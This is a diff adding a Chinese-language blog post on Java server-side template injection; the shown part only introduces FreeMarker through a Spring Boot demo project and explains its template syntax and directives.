@@ -1,0 +1,1412 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/url.jpg">
+  <link rel="icon" href="/img/url.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="J_0k3r">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="让那暴风 柔和地吹 假若离去 只为团聚 -《当这地球没有花》">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java SSTI">
+<meta property="og:url" content="http://example.com/2025/12/23/Java%20SSTI/index.html">
+<meta property="og:site_name" content="J_0k3r">
+<meta property="og:description" content="让那暴风 柔和地吹 假若离去 只为团聚 -《当这地球没有花》">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/fnds.jpg">
+<meta property="article:published_time" content="2025-12-23T05:14:52.000Z">
+<meta property="article:modified_time" content="2025-12-23T15:29:10.579Z">
+<meta property="article:author" content="J_0k3r">
+<meta property="article:tag" content="笔记">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/fnds.jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Java SSTI - J_0k3r</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":180,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"python"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"41fc030db57d5570dd22f78997dc4a7e","google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":true},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?41fc030db57d5570dd22f78997dc4a7e";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>J_0k3r的无人之境</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/playlist/" target="_self">
+                <i class="iconfont icon-music"></i>
+                <span>音乐</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/dzdqmyh.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Java SSTI"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        J_0k3r
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-12-23 13:14" pubdate>
+          2025年12月23日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          10k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          84 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Java SSTI</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年12月23日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><blockquote>
+<p>模板是一种预定义的文档结构或格式，其中包含静态内容和动态占位符（变量、表达式、控制语句等）。在 Web 开发中，模板通常用于生成 HTML 页面或其他文本输出。</p>
+</blockquote>
+<p>常见的模板引擎包括：</p>
+<ul>
+<li>Python：Jinja2、Mako、Django Templates</li>
+<li>Java：Thymeleaf、Freemarker、Velocity</li>
+<li>PHP：Twig、Smarty</li>
+<li>JavaScript（服务端）：EJS、Handlebars</li>
+</ul>
+<p>使用模板的主要目的是实现 关注点分离（Separation of Concerns），具体优势包括：</p>
+<ul>
+<li>前后端解耦：业务逻辑（后端代码）与展示逻辑（HTML 页面）分离，便于开发和维护。</li>
+<li>动态内容生成：可根据用户请求、数据库数据等动态填充页面内容，而无需硬编码 HTML。</li>
+<li>复用性高：模板可被多次调用，传入不同参数生成不同页面（如用户资料页、商品详情页等）。</li>
+<li>提高开发效率：模板引擎通常提供循环、条件判断、继承等语法，简化复杂页面的构建。</li>
+</ul>
+<h2 id="Freemarker"><a href="#Freemarker" class="headerlink" title="Freemarker"></a>Freemarker</h2><p><a target="_blank" rel="noopener" href="http://freemarker.foofun.cn/">http://freemarker.foofun.cn/</a></p>
+<p><img src="/mdimg/javassti/1766222443746-1a35016d-6f3c-43a8-822b-9877a55c23c2.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><p>JAVA17</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;project xmlns=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br>xsi:schemaLocation=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;<br>&lt;modelVersion&gt;<span class="hljs-number">4.0</span><span class="hljs-number">.0</span>&lt;/modelVersion&gt;<br>&lt;parent&gt;<br>&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;<br>&lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;<br>&lt;version&gt;<span class="hljs-number">4.0</span><span class="hljs-number">.1</span>&lt;/version&gt;<br>&lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;<br>&lt;/parent&gt;<br>&lt;groupId&gt;org.example&lt;/groupId&gt;<br>&lt;artifactId&gt;ssti&lt;/artifactId&gt;<br>&lt;version&gt;<span class="hljs-number">0.0</span><span class="hljs-number">.1</span>-SNAPSHOT&lt;/version&gt;<br>&lt;name&gt;ssti&lt;/name&gt;<br>&lt;description&gt;ssti&lt;/description&gt;<br>&lt;url/&gt;<br>&lt;licenses&gt;<br>&lt;license/&gt;<br>&lt;/licenses&gt;<br>&lt;developers&gt;<br>&lt;developer/&gt;<br>&lt;/developers&gt;<br>&lt;scm&gt;<br>&lt;connection/&gt;<br>&lt;developerConnection/&gt;<br>&lt;tag/&gt;<br>&lt;url/&gt;<br>&lt;/scm&gt;<br>&lt;properties&gt;<br>&lt;java.version&gt;<span class="hljs-number">17</span>&lt;/java.version&gt;<br>&lt;/properties&gt;<br>&lt;dependencies&gt;<br>&lt;dependency&gt;<br>&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;<br>&lt;artifactId&gt;spring-boot-starter-freemarker&lt;/artifactId&gt;<br>&lt;/dependency&gt;<br><br>&lt;dependency&gt;<br>&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;<br>&lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;<br>&lt;/dependency&gt;<br><br>&lt;dependency&gt;<br>&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;<br>&lt;artifactId&gt;spring-boot-starter-freemarker-test&lt;/artifactId&gt;<br>&lt;scope&gt;test&lt;/scope&gt;<br>&lt;/dependency&gt;<br>&lt;/dependencies&gt;<br><br>&lt;build&gt;<br>&lt;plugins&gt;<br>&lt;plugin&gt;<br>&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;<br>&lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;<br>&lt;/plugin&gt;<br>&lt;/plugins&gt;<br>&lt;/build&gt;<br><br>&lt;/project&gt;<br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java">├─src<br>│  ├─main<br>│  │  ├─java<br>│  │  │  └─org<br>│  │  │      └─example<br>│  │  │          └─ssti<br>│  │  │              │  SstiApplication.java<br>│  │  │              │<br>│  │  │              └─controller<br>│  │  │                      HelloController.java<br>│  │  │<br>│  │  └─resources<br>│  │      │  application.properties<br>│  │      │  application.yml<br>│  │      │<br>│  │      └─templates<br>│  │              hello.ftl<br>│  │<br>│  └─test<br>│      └─java<br>│          └─org<br>│              └─example<br>│                  └─ssti<br>│                          SstiApplicationTests.java<br>│<br>└─target<br>├─classes<br>│  │  application.properties<br>│  │  application.yml<br>│  │<br>│  ├─org<br>│  │  └─example<br>│  │      └─ssti<br>│  │          │  SstiApplication.class<br>│  │          │<br>│  │          └─controller<br>│  │                  HelloController.class<br>│  │<br>│  └─templates<br>│          hello.ftl<br><br></code></pre></td></tr></table></figure>
+
+<p>application.yml   配置文件，设置模板路径等<code>freemarker</code>的配置</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">server:<br>  port: <span class="hljs-number">8080</span><br><br>spring:<br>  freemarker:<br>    cache: <span class="hljs-literal">false</span><br>    charset: UTF-<span class="hljs-number">8</span><br>    content-type: text/html<br>    suffix: .ftl<br>    template-loader-path: classpath:/templates/<br></code></pre></td></tr></table></figure>
+
+<p>hello.ftl    就是要渲染的html模板文件</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;title&gt;Hello FreeMarker&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1&gt;Hello, $&#123;name!<span class="hljs-string">&quot;none&quot;</span>&#125; &lt;/h1&gt;  &lt;!-- 默认值none--&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+
+<p>HelloController</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.ssti.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.ui.Model;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><br><span class="hljs-keyword">import</span> java.util.Date;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">( <span class="hljs-meta">@RequestParam</span> String name,Model model)</span>&#123;<br>        model.addAttribute(<span class="hljs-string">&quot;name&quot;</span>,name);  <span class="hljs-comment">//设置传递给模板的值</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello&quot;</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/javassti/1766225355503-ec4b901a-c325-4ec4-b0b0-6a0c8cee57ff.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="语法和标签"><a href="#语法和标签" class="headerlink" title="语法和标签"></a>语法和标签</h3><h4 id="注释-lt-–-xxx–-gt"><a href="#注释-lt-–-xxx–-gt" class="headerlink" title="注释&lt;#– xxx–&gt;"></a>注释&lt;#– xxx–&gt;</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#-- 这是 FreeMarker 注释，不会输出到结果中 --&gt;<br></code></pre></td></tr></table></figure>
+
+<h4 id="xxx-插值"><a href="#xxx-插值" class="headerlink" title="${xxx} 插值"></a>${xxx} 插值</h4><p>用于在模板中插入变量的值。</p>
+<p>支持渲染的数据类型</p>
+<table>
+<thead>
+<tr>
+<th>Java 类型</th>
+<th>渲染方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>String</code></td>
+<td>直接输出</td>
+</tr>
+<tr>
+<td><code>int</code>, <code>Integer</code>, <code>long</code>, <code>Long</code>等</td>
+<td>调用 <code>toString()</code></td>
+</tr>
+<tr>
+<td><code>boolean</code>, <code>Boolean</code></td>
+<td>输出 <code>true</code>/<code>false</code></td>
+</tr>
+<tr>
+<td><code>null</code></td>
+<td>默认报错（除非配置了 <code>?default</code> 或 <code>!</code>）</td>
+</tr>
+<tr>
+<td>java.util.Date</td>
+<td><code>$&#123;date?datetime&#125;</code>/<code>$&#123;date?string(&quot;yyyy-MM-dd&quot;)&#125;</code></td>
+</tr>
+<tr>
+<td>Map&lt;K,V&gt;</td>
+<td><code>$&#123;map.key&#125;</code> 等价于 <code>map.get(&quot;key&quot;)</code>（key 必须是字符串）</td>
+</tr>
+<tr>
+<td>JavaBean 对象</td>
+<td>访问getter/public方法</td>
+</tr>
+<tr>
+<td>枚举（<code>Enum</code>）</td>
+<td><code>public enum Status &#123; ACTIVE, INACTIVE &#125;</code>// <code>$&#123;user.status&#125; → &quot;ACTIVE&quot;</code></td>
+</tr>
+</tbody></table>
+<p>如通过传递对象，调用其方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;h1&gt;Hello, $&#123;info.name()&#125; age:$&#123;info.age()&#125; &lt;/h1&gt;<br></code></pre></td></tr></table></figure>
+
+<p>record（Java14+）不用构造函数就可以实例化</p>
+<p><img src="/mdimg/javassti/1766227118316-7919f726-2453-450e-9dc1-738c9dc424a5.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="xxx-指令"><a href="#xxx-指令" class="headerlink" title="#xxx  指令"></a>#xxx  指令</h4><p>以 <code>#</code> 开头，用于控制逻辑流程、宏定义等。</p>
+<ol>
+<li>条件判断：<code>#if</code>, <code>#elseif</code>, <code>#else</code>等</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#<span class="hljs-keyword">if</span> price &lt; <span class="hljs-number">50</span>&gt;<br>  便宜<br>&lt;#elseif price &lt; <span class="hljs-number">100</span>&gt;<br>  中等<br>&lt;#<span class="hljs-keyword">else</span>&gt;<br>  昂贵<br>&lt;/#<span class="hljs-keyword">if</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>循环 #list</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java">    &lt;#list users as user&gt;<br>        &lt;p&gt;$&#123;user_index + <span class="hljs-number">1</span>&#125;. $&#123;user&#125;&lt;/p&gt;<br>    &lt;/#list&gt;<br><br><br><span class="hljs-keyword">package</span> org.example.ssti.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.ui.Model;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">(Model model)</span>&#123;<br>        String[] users = &#123;<span class="hljs-string">&quot;user1&quot;</span>,<span class="hljs-string">&quot;user2&quot;</span>,<span class="hljs-string">&quot;user3&quot;</span>&#125;;<br>        model.addAttribute(<span class="hljs-string">&quot;users&quot;</span>,users);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello&quot;</span>;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>user_index：当前索引（从 0 开始）</p>
+<p><img src="/mdimg/javassti/1766380316884-4bd333de-db0d-40dd-905f-f43ac4ea2ab8.png" srcset="/img/loading.gif" lazyload></p>
+<ol start="3">
+<li>包含模板 #include</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><br>&lt;#include <span class="hljs-string">&quot;header.ftl&quot;</span>&gt;<br>&lt;body&gt;<br>&lt;h1&gt;<br>    &lt;#list users as user&gt;<br>        &lt;p&gt;$&#123;user_index + <span class="hljs-number">1</span>&#125;. $&#123;user&#125;&lt;/p&gt;<br>    &lt;/#list&gt;<br>&lt;/h1&gt;<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/javassti/1766380524595-2c25a81c-5ae6-47f5-b6d0-b90fec6fe43b.png" srcset="/img/loading.gif" lazyload></p>
+<ol start="4">
+<li>定义宏 @#macro</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#macro nowtime time&gt;<br>  nowtime is $&#123;time&#125;!<br>&lt;/#macro&gt;<br></code></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>导入宏库 #import</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;time.ftl&quot;</span> as time&gt;<br>&lt;<span class="hljs-meta">@time</span>.nowtime time=<span class="hljs-string">&quot;2025&quot;</span>/&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/javassti/1766380950144-d0db163f-c22a-483d-a9fa-c5df502049d2.png" srcset="/img/loading.gif" lazyload></p>
+<ol start="6">
+<li>赋值 #assign</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#<span class="hljs-type">assign</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>&gt;<br>&lt;#<span class="hljs-type">assign</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> x + <span class="hljs-number">5</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/javassti/1766381102524-cbe9d9af-43de-4016-86c4-427e4f89221f.png" srcset="/img/loading.gif" lazyload></p>
+<p>也可用于创建复杂对象：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;#assign time = &#123;&quot;year&quot;: &quot;2025&quot;, &quot;moon&quot;: 12&#125;&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/javassti/1766381206680-aa69b68f-d3ba-4e2d-a345-7378377806ba.png" srcset="/img/loading.gif" lazyload></p>
+<ol start="7">
+<li>局部变量 #local</li>
+</ol>
+<p>仅在宏内部使用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;#macro nowtime time&gt;<br>    &lt;#local nexttime=2026&gt;<br>    now time is $&#123;time!nexttime&#125;!<br>&lt;/#macro&gt;<br></code></pre></td></tr></table></figure>
+
+<ol start="8">
+<li>设置配置 #setting</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;#setting number_format=&quot;0.##&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/javassti/1766381869190-f8e48c0d-04a2-497e-a950-c7817c9f122f.png" srcset="/img/loading.gif" lazyload></p>
+<ol start="9">
+<li>停止处理 #stop</li>
+</ol>
+<p>调试时使用，立即停止模板处理。</p>
+<ol start="10">
+<li>&lt;#break&gt;类似于循环中断，只能在 #list里使用</li>
+</ol>
